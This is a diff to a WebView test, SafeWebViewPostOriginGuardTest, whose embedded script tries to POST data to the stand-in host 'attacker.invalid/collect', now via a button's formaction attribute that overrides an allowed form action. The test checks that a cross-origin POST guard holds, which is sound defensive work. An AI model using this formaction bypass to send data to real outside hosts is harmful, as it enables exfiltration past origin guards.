@@ -61,10 +61,15 @@ class SafeWebViewPostOriginGuardTest {
                     <script>
                         const form = document.createElement('form');
                         form.method = 'POST';
-                        form.action = 'https://attacker.invalid/collect';
+                        form.action = 'https://sitebin.test/allowed';
+                        const submitter = document.createElement('button');
+                        submitter.type = 'submit';
+                        submitter.setAttribute('formaction', 'https://attacker.invalid/collect');
+                        submitter.textContent = 'submit';
+                        form.appendChild(submitter);
                         document.body.appendChild(form);
                         document.body.setAttribute('data-post-attempted', 'true');
-                        form.submit();
+                        submitter.click();
                         document.body.setAttribute('data-origin-after-submit', location.origin);
                     </script>
                     </body>
